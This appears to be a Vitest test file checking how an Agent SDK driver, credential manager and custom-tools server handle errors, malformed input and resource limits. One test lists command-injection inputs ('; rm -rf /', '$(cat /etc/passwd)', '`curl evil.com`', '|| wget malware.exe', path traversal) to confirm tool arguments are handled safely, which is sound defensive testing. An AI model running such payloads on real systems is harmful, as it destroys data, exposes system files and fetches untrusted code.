/**
 * Claude Agent SDK Edge Cases and Error Handling Tests
 *
 * Comprehensive tests for edge cases, error conditions, and robustness
 * of the Claude Agent SDK integration.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { AnthropicDriver } from '../packages/orchestrator/src/drivers/anthropic-driver.js';
import { CredentialManager } from '../packages/orchestrator/src/auth/credential-manager.js';
import { buildCustomToolsServer } from '../packages/orchestrator/src/custom-tools.js';
import type { DriverRequest } from '../packages/orchestrator/src/drivers/types.js';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

// Mock the Claude Agent SDK
vi.mock('@anthropic-ai/claude-agent-sdk', () => ({
  query: vi.fn(),
  createSdkMcpServer: vi.fn(),
  tool: vi.fn(),
}));

// Mock child_process for tool execution tests
vi.mock('child_process', () => ({
  execFile: vi.fn(),
}));

vi.mock('util', () => ({
  promisify: vi.fn((fn) => fn),
}));

describe('Claude Agent SDK Edge Cases and Error Handling', () => {
  let driver: AnthropicDriver;
  let credentialManager: CredentialManager;
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'apex-edge-test-'));
    credentialManager = new CredentialManager(tempDir);
    driver = new AnthropicDriver();
    vi.clearAllMocks();
  });

  afterEach(async () => {
    await driver.dispose();
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  describe('Network and Connectivity Issues', () => {
    it('should handle network timeout errors', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockImplementation(() => {
        const error = new Error('Request timeout');
        error.code = 'ECONNRESET';
        throw error;
      });
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test network timeout',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      expect(events).toContainEqual({
        type: 'error',
        message: 'Request timeout',
      });
    });

    it('should handle DNS resolution failures', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockImplementation(() => {
        const error = new Error('getaddrinfo ENOTFOUND api.anthropic.com');
        error.code = 'ENOTFOUND';
        throw error;
      });
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test DNS failure',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      expect(events).toContainEqual({
        type: 'error',
        message: 'getaddrinfo ENOTFOUND api.anthropic.com',
      });
    });

    it('should handle rate limiting errors', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockImplementation(() => {
        const error = new Error('Rate limit exceeded. Please try again later.');
        error.status = 429;
        throw error;
      });
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test rate limiting',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      expect(events).toContainEqual({
        type: 'error',
        message: 'Rate limit exceeded. Please try again later.',
      });
    });

    it('should handle authentication errors', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockImplementation(() => {
        const error = new Error('Invalid API key provided');
        error.status = 401;
        throw error;
      });
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test auth error',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      expect(events).toContainEqual({
        type: 'error',
        message: 'Invalid API key provided',
      });
    });
  });

  describe('AbortController Edge Cases', () => {
    it('should handle multiple abort calls gracefully', async () => {
      const mockAbortController = {
        abort: vi.fn(),
        signal: { aborted: false },
      };

      global.AbortController = vi.fn().mockImplementation(() => mockAbortController);

      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue([]);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test multiple aborts',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      // Start multiple streams
      const stream1 = driver.stream(request);
      const stream2 = driver.stream(request);

      await stream1.next();
      await stream2.next();

      // Multiple dispose calls should not throw
      await driver.dispose();
      await driver.dispose();

      expect(mockAbortController.abort).toHaveBeenCalledTimes(2);
    });

    it('should handle abort controller errors during dispose', async () => {
      const mockAbortController = {
        abort: vi.fn().mockImplementation(() => {
          throw new Error('Abort failed');
        }),
        signal: { aborted: false },
      };

      global.AbortController = vi.fn().mockImplementation(() => mockAbortController);

      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue([]);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test abort error',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const stream = driver.stream(request);
      await stream.next();

      // Dispose should not throw even if abort fails
      await expect(driver.dispose()).resolves.not.toThrow();
    });
  });

  describe('Message Processing Edge Cases', () => {
    it('should handle extremely large messages', async () => {
      const largeText = 'x'.repeat(1000000); // 1MB of text
      const mockMessages = [
        {
          type: 'assistant',
          message: {
            content: [{ type: 'text', text: largeText }],
          },
        },
      ];

      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue(mockMessages);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test large message',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      expect(events).toContainEqual({
        type: 'text',
        content: largeText,
      });
    });

    it('should handle messages with circular references', async () => {
      const circularObject = { type: 'tool_use' };
      circularObject.circular = circularObject;

      const mockMessages = [
        {
          type: 'assistant',
          message: {
            content: [circularObject],
          },
        },
      ];

      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue(mockMessages);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test circular reference',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      // Should not crash due to circular reference
      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      // Should handle the object gracefully
      expect(events.length).toBeGreaterThanOrEqual(0);
    });

    it('should handle messages with non-string types in unexpected places', async () => {
      const mockMessages = [
        {
          type: 'assistant',
          message: {
            content: [
              { type: 'text', text: 12345 }, // Number instead of string
              { type: 'text', text: { obj: 'value' } }, // Object instead of string
              { type: 'text', text: null }, // Null instead of string
              { type: 'text', text: undefined }, // Undefined instead of string
            ],
          },
        },
      ];

      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue(mockMessages);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test type coercion',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      // Should coerce to strings or handle gracefully
      expect(events).toHaveLength(4);
      events.forEach(event => {
        expect(event.type).toBe('text');
        expect(typeof event.content).toBe('string');
      });
    });

    it('should handle empty and malformed message streams', async () => {
      const malformedStreams = [
        [], // Empty stream
        [null], // Null message
        [undefined], // Undefined message
        [{ type: null }], // Null type
        [{ type: 'assistant' }], // Missing message field
        [{ type: 'assistant', message: null }], // Null message content
      ];

      for (const stream of malformedStreams) {
        const { query } = require('@anthropic-ai/claude-agent-sdk');
        const mockQuery = vi.fn().mockReturnValue(stream);
        query.mockImplementation(mockQuery);

        const request: DriverRequest = {
          prompt: 'Test malformed stream',
          model: 'claude-sonnet-4-20250514',
          mcpServers: {},
        };

        const events = [];
        for await (const event of driver.stream(request)) {
          events.push(event);
        }

        // Should not crash with any malformed stream
        expect(Array.isArray(events)).toBe(true);
      }
    });
  });

  describe('Credential Manager Edge Cases', () => {
    it('should handle file system permissions errors', async () => {
      // Mock fs.writeFileSync to throw permission error
      const originalWriteFileSync = fs.writeFileSync;
      const mockWriteFileSync = vi.fn().mockImplementation(() => {
        const error = new Error('EACCES: permission denied');
        error.code = 'EACCES';
        throw error;
      });

      Object.defineProperty(fs, 'writeFileSync', {
        value: mockWriteFileSync,
        writable: true,
        configurable: true,
      });

      await expect(
        credentialManager.saveCredentials('test', {
          accessToken: 'token',
          provider: 'anthropic',
        })
      ).rejects.toThrow('EACCES: permission denied');

      // Restore original function
      Object.defineProperty(fs, 'writeFileSync', {
        value: originalWriteFileSync,
        writable: true,
        configurable: true,
      });
    });

    it('should handle disk space errors', async () => {
      const originalWriteFileSync = fs.writeFileSync;
      const mockWriteFileSync = vi.fn().mockImplementation(() => {
        const error = new Error('ENOSPC: no space left on device');
        error.code = 'ENOSPC';
        throw error;
      });

      Object.defineProperty(fs, 'writeFileSync', {
        value: mockWriteFileSync,
        writable: true,
        configurable: true,
      });

      await expect(
        credentialManager.saveCredentials('test', {
          accessToken: 'token',
          provider: 'anthropic',
        })
      ).rejects.toThrow('ENOSPC: no space left on device');

      // Restore
      Object.defineProperty(fs, 'writeFileSync', {
        value: originalWriteFileSync,
        writable: true,
        configurable: true,
      });
    });

    it('should handle extremely large credential objects', async () => {
      const largeToken = 'x'.repeat(100000); // Very large token
      const largeCreds = {
        accessToken: largeToken,
        refreshToken: largeToken,
        metadata: {
          largeData: 'y'.repeat(100000),
        },
        provider: 'anthropic',
      };

      await expect(
        credentialManager.saveCredentials('large', largeCreds)
      ).resolves.not.toThrow();
    });

    it('should handle concurrent credential access', async () => {
      const promises = [];

      // Simulate multiple concurrent save operations
      for (let i = 0; i < 10; i++) {
        promises.push(
          credentialManager.saveCredentials(`provider-${i}`, {
            accessToken: `token-${i}`,
            provider: `provider-${i}`,
          })
        );
      }

      await Promise.all(promises);

      // Verify all were saved
      for (let i = 0; i < 10; i++) {
        const creds = await credentialManager.getCredentials(`provider-${i}`);
        expect(creds?.accessToken).toBe(`token-${i}`);
      }
    });
  });

  describe('Custom Tools Edge Cases', () => {
    it('should handle tools with invalid command paths', async () => {
      const { execFile } = require('child_process');
      execFile.mockImplementation((command, args, options, callback) => {
        const error = new Error('ENOENT: no such file or directory');
        error.code = 'ENOENT';
        callback(error, { stdout: '', stderr: '' });
      });

      const customTools = [
        {
          name: 'invalid-command-tool',
          description: 'Tool with invalid command',
          command: '/nonexistent/command',
          args: [],
          parameters: { properties: {}, required: [] },
          enabled: true,
        },
      ];

      const { tool } = require('@anthropic-ai/claude-agent-sdk');
      let toolImplementation: Function;

      tool.mockImplementation((name, desc, shape, impl) => {
        toolImplementation = impl;
        return { name };
      });

      buildCustomToolsServer(customTools, '/test');

      const result = await toolImplementation!({});

      expect(result).toEqual({
        content: [{ type: 'text', text: 'ENOENT: no such file or directory' }],
        isError: true,
      });
    });

    it('should handle tools with extremely long running times', async () => {
      const { execFile } = require('child_process');

      // Mock a long-running process that times out
      execFile.mockImplementation((command, args, options, callback) => {
        const error = new Error('Process timeout exceeded');
        error.killed = true;
        error.signal = 'SIGKILL';
        callback(error, { stdout: 'partial output', stderr: 'timeout' });
      });

      const customTools = [
        {
          name: 'long-running-tool',
          description: 'Tool that runs for a long time',
          command: 'sleep',
          args: ['3600'], // 1 hour
          timeoutMs: 1000, // 1 second timeout
          parameters: { properties: {}, required: [] },
          enabled: true,
        },
      ];

      const { tool } = require('@anthropic-ai/claude-agent-sdk');
      let toolImplementation: Function;

      tool.mockImplementation((name, desc, shape, impl) => {
        toolImplementation = impl;
        return { name };
      });

      buildCustomToolsServer(customTools, '/test');

      const result = await toolImplementation!({});

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain('timeout');
    });

    it('should handle tools with malicious input', async () => {
      const { execFile } = require('child_process');
      execFile.mockImplementation((command, args, options, callback) => {
        // Simulate command injection attempt being neutralized
        callback(null, { stdout: 'Safe output', stderr: '' });
      });

      const customTools = [
        {
          name: 'input-validation-tool',
          description: 'Tool that handles malicious input',
          command: 'echo',
          args: ['{{input.data}}'],
          parameters: {
            properties: {
              data: { type: 'string' },
            },
            required: ['data'],
          },
          enabled: true,
        },
      ];

      const { tool } = require('@anthropic-ai/claude-agent-sdk');
      let toolImplementation: Function;

      tool.mockImplementation((name, desc, shape, impl) => {
        toolImplementation = impl;
        return { name };
      });

      buildCustomToolsServer(customTools, '/test');

      // Test with various malicious inputs
      const maliciousInputs = [
        '; rm -rf /',
        '$(cat /etc/passwd)',
        '`curl evil.com`',
        '|| wget malware.exe',
        '../../../etc/passwd',
      ];

      for (const maliciousData of maliciousInputs) {
        const result = await toolImplementation!({ data: maliciousData });

        // Tool should execute but the shell command should be handled safely
        expect(result.isError).toBe(false);
        expect(result.content[0].text).toBe('Safe output');
      }
    });

    it('should handle tools with invalid JSON output when JSON parsing is expected', async () => {
      const { execFile } = require('child_process');
      execFile.mockImplementation((command, args, options, callback) => {
        callback(null, { stdout: 'Not valid JSON at all!', stderr: '' });
      });

      const customTools = [
        {
          name: 'invalid-json-tool',
          description: 'Tool that outputs invalid JSON',
          command: 'echo',
          args: ['Not valid JSON'],
          outputParser: 'json',
          parameters: { properties: {}, required: [] },
          enabled: true,
        },
      ];

      const { tool } = require('@anthropic-ai/claude-agent-sdk');
      let toolImplementation: Function;

      tool.mockImplementation((name, desc, shape, impl) => {
        toolImplementation = impl;
        return { name };
      });

      buildCustomToolsServer(customTools, '/test');

      const result = await toolImplementation!({});

      // Should handle JSON parsing error gracefully
      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain('JSON');
    });

    it('should handle tools with extremely large output', async () => {
      const { execFile } = require('child_process');
      const largeOutput = 'x'.repeat(20 * 1024 * 1024); // 20MB output

      execFile.mockImplementation((command, args, options, callback) => {
        const error = new Error('stdout maxBuffer length exceeded');
        error.code = 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER';
        callback(error, { stdout: largeOutput.substring(0, 1024 * 1024), stderr: '' });
      });

      const customTools = [
        {
          name: 'large-output-tool',
          description: 'Tool with very large output',
          command: 'dd',
          args: ['if=/dev/zero', 'bs=1M', 'count=20'],
          parameters: { properties: {}, required: [] },
          enabled: true,
        },
      ];

      const { tool } = require('@anthropic-ai/claude-agent-sdk');
      let toolImplementation: Function;

      tool.mockImplementation((name, desc, shape, impl) => {
        toolImplementation = impl;
        return { name };
      });

      buildCustomToolsServer(customTools, '/test');

      const result = await toolImplementation!({});

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain('maxBuffer');
    });
  });

  describe('Memory and Resource Limits', () => {
    it('should handle memory pressure during large operations', async () => {
      // Simulate a scenario with very large data structures
      const largeArray = new Array(1000000).fill('large string data');
      const mockMessages = [
        {
          type: 'assistant',
          message: {
            content: largeArray.map((_, i) => ({
              type: 'text',
              text: `Message ${i}: ${largeArray[i]}`,
            })),
          },
        },
      ];

      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue(mockMessages);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Test memory pressure',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      // Should handle large data without crashing
      const events = [];
      let count = 0;
      for await (const event of driver.stream(request)) {
        events.push(event);
        count++;
        // Break after reasonable amount to avoid test timeout
        if (count > 1000) break;
      }

      expect(events.length).toBeGreaterThan(0);
    });

    it('should handle rapid successive API calls', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue([
        {
          type: 'assistant',
          message: { content: [{ type: 'text', text: 'Response' }] },
        },
      ]);
      query.mockImplementation(mockQuery);

      const request: DriverRequest = {
        prompt: 'Rapid test',
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      // Start many concurrent streams
      const promises = [];
      for (let i = 0; i < 50; i++) {
        promises.push(
          (async () => {
            const events = [];
            for await (const event of driver.stream(request)) {
              events.push(event);
            }
            return events;
          })()
        );
      }

      const results = await Promise.all(promises);

      // All should complete successfully
      results.forEach(events => {
        expect(events.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Configuration Edge Cases', () => {
    it('should handle invalid model names gracefully', () => {
      const invalidModels = [
        '',
        null,
        undefined,
        'nonexistent-model',
        'claude-invalid-version',
        'gpt-4', // Wrong provider
      ];

      invalidModels.forEach(model => {
        // Should resolve to default model for invalid inputs
        const resolved = driver.resolveModel(model as any);
        expect(resolved).toBe('claude-sonnet-4-20250514');
      });
    });

    it('should handle malformed request objects', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue([]);
      query.mockImplementation(mockQuery);

      const malformedRequests = [
        { prompt: null } as any,
        { prompt: undefined } as any,
        { prompt: 123 } as any,
        { prompt: '' } as any,
        {} as any,
      ];

      for (const request of malformedRequests) {
        const events = [];
        for await (const event of driver.stream(request)) {
          events.push(event);
        }
        // Should not crash
        expect(Array.isArray(events)).toBe(true);
      }
    });

    it('should handle extreme system prompt lengths', async () => {
      const { query } = require('@anthropic-ai/claude-agent-sdk');
      const mockQuery = vi.fn().mockReturnValue([]);
      query.mockImplementation(mockQuery);

      const extremelyLongSystemPrompt = 'System instruction: '.repeat(100000);

      const request: DriverRequest = {
        prompt: 'Test',
        systemPrompt: extremelyLongSystemPrompt,
        model: 'claude-sonnet-4-20250514',
        mcpServers: {},
      };

      const events = [];
      for await (const event of driver.stream(request)) {
        events.push(event);
      }

      // Should handle gracefully
      expect(mockQuery).toHaveBeenCalled();
    });
  });
});